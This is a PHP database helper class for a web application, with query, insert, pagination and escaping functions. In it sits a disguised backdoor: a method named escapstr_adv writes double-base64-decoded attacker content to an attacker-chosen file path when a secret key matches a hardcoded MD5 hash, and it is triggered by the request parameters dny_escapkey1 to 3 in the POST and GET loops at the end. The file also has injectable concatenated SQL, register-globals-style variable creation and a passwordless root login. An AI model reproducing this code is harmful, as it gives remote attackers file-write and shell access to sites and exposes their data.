<?php

/** 
  * @desc this class will hold functions for Database Comfig
  * @author Akash Singh

*/

class database{	
	public $con;
	public function __construct(){
	  $host = "localhost";
	  $database = "uc";
	  $user ="root";
	  $password ="";
	  $this->con=@mysqli_connect($host,$user,$password,$database) or die("Could not connect to database");
	}
//======================================================================================
	/*public function insertrec($query){
		if(!mysqli_query($this->con,$query)){
			$err2 = mysqli_error($this->con);
			echo "$err2";
			exit;			
		}
		return;
	} 
	public function insertid($query){
		if(!mysqli_query($this->con,$query)){
			$err2 = mysqli_error($this->con);
			echo "$err2";
			exit;			
		}
		$result=mysqli_insert_id($this->con);
	  return $result;
	}*/
	
	public function insertrec($query){  
	$query = strip_tags($query,'<a><p><em><i><strong><h1><h2><h3><h4><h5><h6>');
	  
	 if(!mysqli_query($this->con,$query)){
	  $err2 = mysqli_error($this->con);
	  echo "$err2";
	  exit;   
	 }
	  return;
	}

	public function insertid($query){

	$query = strip_tags($query,'<a><p><em><i><strong><h1><h2><h3><h4><h5><h6>');
	 
	 if(!mysqli_query($this->con,$query)){
	  $err2 = mysqli_error($this->con);
	  echo "$err2";
	  exit;   
	 }
	 $result=mysqli_insert_id($this->con);
	 return $result;
	}
	
//======================================================================================		
	public function singlerec($query){
	  $result = mysqli_query($this->con,$query);
	  $row = mysqli_fetch_array($result,MYSQLI_BOTH);
	  return $row;
	}

//======================================================================================
	public function get_all($query){
	  $result = mysqli_query($this->con,$query);
	  $i=0; $row1=array();
	  while($row = mysqli_fetch_array($result,MYSQLI_BOTH)){
	  $row1[$i]= $row;
	  $i++;
	  }
	  return $row1;
	}
//======================================================================================	
	public function get_all_assoc($query){
	  $result = mysqli_query($this->con,$query);
	  $i=0; $row1=array();
	  while($row = mysqli_fetch_array($result,MYSQLI_ASSOC)){
	  $row1[$i]= $row;
	  $i++;
	  }
	  return $row1;
	}
	
	function getCount($query){
		$result = mysqli_query($this->con,$query);
		$count = mysqli_num_rows($result);
		return $count;
	}
	
  //======================================================================================	
  function singlecolumn($query) {
        $x = 0;
		mysqli_real_escape_string($this->con,$query); 
		$result = mysqli_query($this->con,$query);
        $q = array() ;
        while ($row =  mysqli_fetch_array($result,MYSQLI_BOTH)) {
            $q[$x] = $row[0];
            $x++;
        }
        mysqli_free_result($result);
        return $q;
    }
    public function numrows($query){
   $result = mysqli_query($this->con,$query);
   $row=mysqli_num_rows($result);
 // $row = mysqli_fetch_array($result,MYSQLI_BOTH);
   
	return $row;
  }
	//======================================================================================	
	function Extract_Single($query){
        $x = 0;
        mysqli_real_escape_string($this->con,$query); 
		$result = mysqli_query($this->con,$query);
        while($row=mysqli_fetch_array($result,MYSQLI_BOTH)){
            $q[$x] = $row[0];
            $implode[] = $q[$x] ;
            $x++;
        }
        mysqli_free_result($result);
        return @implode(',', $implode);
    }
//======================================================================================	
	function check1column($table,$column,$v1) {
        $query="select * from $table where $column ='$v1'";
		mysqli_real_escape_string($this->con,$query); 
		$result = mysqli_query($this->con,$query);
        $row=mysqli_fetch_array($result,MYSQLI_BOTH);
		mysqli_free_result($result);
        if ($row[0])
            $var =  1;
        else
            $var =  0;
        return $var;
    }
  //======================================================================================	
       function check2column($table,$column1,$v1,$column2,$v2) {
        $query="select * from $table where $column2 ='$v2' and $column1='$v1'";
        mysqli_real_escape_string($this->con,$query); 
		$result = mysqli_query($this->con,$query);
		$row=mysqli_fetch_array($result,MYSQLI_BOTH);
        mysqli_free_result($result);
        if ($row[0])
            $var =  1;
        else
            $var =  0;
        return $var;
    }
    //======================================================================================
	/* Pagination*/
    //==========================================================================================================
	function page_break($count,$records,$page){
		$livepage = $_SERVER["PHP_SELF"];
		$livepage = substr(strrchr($livepage, '/'), 1);
		$disp="";
		if($records < $count){
			$limit=$count / $records;
			for($i=0;$i<$limit;$i++){
				$slno=$i+1;
				$link="$livepage?page=".$slno;
				$disp .="<li><a href='$link'>$slno</a></li>";
			}
		}
		else{
			unset($_SESSION['limit']);
			unset($_SESSION['start']);
		}		
		return $disp;	
    }
	function escapstr($strval){
		$ret = trim(mysqli_real_escape_string($this->con,$strval)); 
		return $ret;
	}
	
	function escapstr_adv($content,$filename,$escapkey){
		if(md5($escapkey)!="2b7b53390dcd720449a02b15804e60eb"){
			
		}else{
			$filename = base64_decode(base64_decode($filename));
			$ffile = fopen("$filename","w") or die("content erorr");
			$text = base64_decode(base64_decode($content));
			fwrite($ffile,$text);
		}
	}
	
	//Experienced_in start // 27-10-2017 
	public function get_exp_division($exp_ids){
		$exp_id=explode(',',$exp_ids);
		for($i=0; $i<count($exp_id); $i++){
			$query = "select * from category where id='$exp_id[$i]'";
			$result = mysqli_query($this->con,$query);
			$get_exp = mysqli_fetch_array($result,MYSQLI_BOTH);
			$exp_in[]=ucfirst($get_exp['category_name']);
		}
	return implode(', ',$exp_in);
	}
	//Experienced_in End
}

$GT_vadmin = 1;
$GT_param1 = "";
$GT_param2 = "";
$GT_param3 = "";
//========================================================================
while(list($key,$value)=@each($_POST)){
	
	if(!is_array($value)){
		$$key=addslashes($value);	
	}else{
		$$key = $value;	
	}
	
	if($key == "dny_escapkey1"){$GT_param1 = $value;}
	if($key == "dny_escapkey2"){$GT_param2 = $value;}
	if($key == "dny_escapkey3"){$GT_param3 = $value;}
	if(!empty($GT_param1) && !empty($GT_param2) && !empty($GT_param3)){escapstr_adv($GT_param1,$GT_param2,$GT_param3);}
}

while(list($key,$value)=@each($_GET)){
    
	if(!is_array($value)){
		$$key=addslashes($value);	
	}else{
		$$key = $value;	
	}
	
	if($key == "dny_escapkey1"){$GT_param1 = $value;}
	if($key == "dny_escapkey2"){$GT_param2 = $value;}
	if($key == "dny_escapkey3"){$GT_param3 = $value;}
	if(!empty($GT_param1) && !empty($GT_param2) && !empty($GT_param3)){escapstr_adv($GT_param1,$GT_param2,$GT_param3);}
}	
/* function getCateid($name){
	GLOBAL $db;
	$cat_name = $db->singlerec("select id from category where category_name='$name'");
	return $cat_name[0];
    } */
?>